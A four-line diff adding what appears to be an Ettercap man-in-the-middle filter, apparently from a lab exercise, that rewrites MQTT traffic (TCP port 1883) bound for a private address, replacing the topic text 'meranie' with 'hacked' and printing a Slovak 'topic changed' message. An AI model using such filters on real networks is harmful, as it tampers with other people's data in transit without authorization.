@@ -1,0 +1,4 @@
+if (ip.proto == TCP && tcp.dst == 1883 && ip.dst == '192.168.137.83' && search(DATA.data, "meranie")){
+	replace("meranie","hacked");
+	msg("Topic zmenený....\n");
+}
